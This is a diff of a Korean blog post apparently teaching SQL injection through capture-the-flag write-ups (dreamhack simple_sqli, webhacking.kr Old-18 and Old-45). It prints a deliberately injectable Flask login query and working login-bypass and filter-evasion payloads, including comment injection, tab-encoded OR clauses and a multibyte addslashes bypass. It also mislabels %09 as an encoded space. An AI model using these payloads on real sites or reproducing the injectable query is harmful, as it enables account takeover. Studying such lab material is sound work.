@@ -1,35 +1,131 @@
 # [웹 보안] SQL injection 공격
 
 ### 개요
-이번 블로그에서는 sql injection 공격을 살펴보고 간단한 웹 문제를 몇가지 풀어보고자 합니다.
+이번 블로그에서는 sql injection 공격을 살펴보고 간단한 웹해킹 문제를 몇가지 풀어보고자 합니다.
 
 ### 1. SQL injection 공격이란?
-SQL injection은 SQL문에 들어가야할 파라미터로 문자열을 삽입해 권한 등을 탈취할 수 있는 공격입니다.
+SQL injection은 SQL문에 들어가야할 파라미터로 악성 문자열을 삽입해 권한 등을 탈취할 수 있는 공격입니다.
 
 백엔드에 데이터베이스와 통신하는 SQL문이 다음과 같이 작성되었다고 가정하겠습니다.  
 ```sql
 SELECT user FROM user_table WHERE id='아이디' AND password='비밀번호';
 ```
 
-무엇을 입력해야지 SQL문을 악용해 권한을 탈취할 수 있을까요?  
-공격자는 비밀번호에 다음과 같이 입력합니다. `' OR '1' = '1`
+패스워드에 무엇을 입력해야지 SQL문을 악용해 권한을 탈취할 수 있을까요?  
 
+바로 패스워드에 `' OR '1' = '1`를 입력합니다.  
+값이 필터에 걸리지 않고 들어가게 된다면 이렇게 들어가게 될 것입니다.
 
+```sql
+SELECT user FROM user_table WHERE id='아이디' AND password='' OR '1' = '1';
+```
 
+여기서 아이디에 admin의 아이디를 넣는다면 다음과 같은 sql 구문이 완성됩니다.
 
-스프링에서는 MyBatis에서 SQL injection 공격을 많이 당한다.
+```sql
+SELECT user FROM user_table WHERE id='admin' AND password='' OR '1' = '1';
+> 권한 탈취 성공!
+```
 
-### 2. xss dreamhack.io simple_sqli 문제
+이렇게 특정 코드를 삽입해 개발자가 의도한 쿼리가 아닌 공격자가 원하는 쿼리가 실행 되는 것을 sql injection 공격이라 합니다.  
 
+### 2. dreamhack.io simple_sqli 문제 풀이
 
-### 3. [Webhacking] Old-18 문제
+먼저 서버 코드를 확인합시다.
 
-### 4. [Webhacking] Old-45 문제 (필터링 우회)
+```py
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'GET':
+        return render_template('login.html')
+    else:
+        userid = request.form.get('userid')
+        userpassword = request.form.get('userpassword')
+        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
+        if res:
+            userid = res[0]
+            if userid == 'admin':
+                return f'hello {userid} flag is {FLAG}'
+            return f'<script>alert("hello {userid}");history.go(-1);</script>'
+        return '<script>alert("wrong");history.go(-1);</script>'
+       
+
+app.run(host='0.0.0.0', port=8000)
+```
+
+```sql
+select * from users where userid="{userid}" and userpassword="{userpassword}"
+```
+
+핵심은 코드에서 날리는 이 쿼리입니다.  
+userid를 입력할 때 `--` 를 입력하면 뒤에 있는 줄이 모두 주석 처리됩니다.  
+sql 문법에서는 `--` 가 주석 처리하는 문법이기 때문입니다.  
+
+userId 부분에 `admin"--` 을 입력하면
+
+```sql
+select * from users where userid="admin"--" and userpassword="{userpassword}"
+```
+
+쿼리가 이렇게 바뀌어 관리자 권한을 탈취할 수 있습니다.
+
+### 3. [Webhacking] Old-18 문제 풀이
+
+<img src="https://user-images.githubusercontent.com/45661217/234212791-02439cb9-6cc0-424a-a95e-19cec74d1fa1.png" width="100%"></img>
+
+view-source를 눌러 코드를 확인해봅시다.
+<img src="https://user-images.githubusercontent.com/45661217/234212210-b52de7fe-8ffc-41d7-a9b3-ade91fce7a70.png" width="100%"></img>
+
+```sql
+select id from challl8 where id = 'guest' and no=$_GET[no]
+```
+
+이번에는 다른 문제입니다. 이때까진 id가 admin이었거나 명시되어있지 않았는데 guest라고 앞에서 명시되어 있어서 단순 주석만으로는 풀이가 힘들 것 같습니다.  
+하지만 or 문을 사용하는 것은 어떨까요?
+
+```sql
+-- 11은 아무 숫자입니다.
+select id from challl8 where id = 'guest' and no=11 or no=2
+```
+
+admin no가 2라는 것을 이용해서 쿼리문을 이렇게 짠다면 권한을 탈취할 수 있을 것입니다.  
+하지만 문제가 또 있습니다.  
+위 코드를 확인하면 preg_match로 필터링을 하고 있습니다.  
+위 요청에서는 공백을 필터링 하고 있기 때문에 해당 코드는 실행이 되지 않습니다.
+
+하지만 get 요청(url param)으로 받기 때문에 주소창으로 공백을 encode한 값을 입력하면 됩니다.  
+공백을 url-encode하면 `%09`이고 앞 요청과 조합해  
+`11%09or%09no=2` 을 주소창에 입력하면 필터링을 통과해 문제를 풀 수 있습니다.
+
+### 4. [Webhacking] Old-45 문제 풀이 (필터링 우회)
 
 <img src="https://user-images.githubusercontent.com/45661217/233233384-5ebc4ec1-33fa-40e1-b574-e245c93c87ec.png" width="100%"></img>
 
 <big>5-1. 코드 분석</big>  
-아이디 패스워드를 값으로 받고 아이디와 패스워드를 addslashes함수를 이용해 인코딩합니다.  
-그리고 =, \<, \> 등의 문자열을 필터링합니다.  
+- 아이디 패스워드를 값으로 받고 아이디와 패스워드를 addslashes 함수를 이용해 인코딩합니다.  
+- 그리고 =, \<, \> 등의 문자열을 필터링합니다.  
+- 쿼리문에서 pw를 md5로 해시해서 저장합니다.
+- id를 불러오는 쿼리를 실행하고 그 결과가 admin인지 아닌지에 따라 정답을 판별합니다.
 
+<big>5-2. 생각해야할 것</big>
+1. mb_convert_encoding 취약점
+2. admin 필터링
+3. = 필터링
 
+mb_convert_encoding의 취약점은 멀티바이트를 사용하는 언어셋 환경에서 \ 앞에 %a1~%fe의 값이 들어오면 인코딩이 깨지면서 백슬래시를 덮어쓰는 취약점이 있습니다.  
+이 문제에서는 addslashes함수가 작은 따옴표 앞에 \를 붙여줍니다.   
+따라서 %aa'를 입력하면 %aa\가 사라져 작은 따옴표만 남아 작은 따옴표 사용이 가능해집니다.  
+
+나머지로 admin은 타 진법으로 변환하고 = 은 like로 우회가 가능합니다.  
+
+```text
+?id=%aa%27%20or%20id%20like%200x61646d696e%23&pw=guest
+```
+다음을 url에 넣으면 문제를 풀 수 있습니다.  
+%20과 같은 값들은 혹시 몰라서 문자를 encoding 시킨 것입니다.  
+
+### 레퍼런스
+
+[Webhacking.kr 18번 문제(old)](https://winkite1226.tistory.com/112)  
+[Webhacking.kr 50-sql injection(mb_convert_encoding 취약점)](http://latifundium.blogspot.com/2016/08/webhackingkr-50-sql-injectionmbconverte.html)  
+[웹해킹 SQLI 우회기법 정리 - Webhacking SQL Injection Bypass Honey Tips](https://ar9ang3.tistory.com/7)
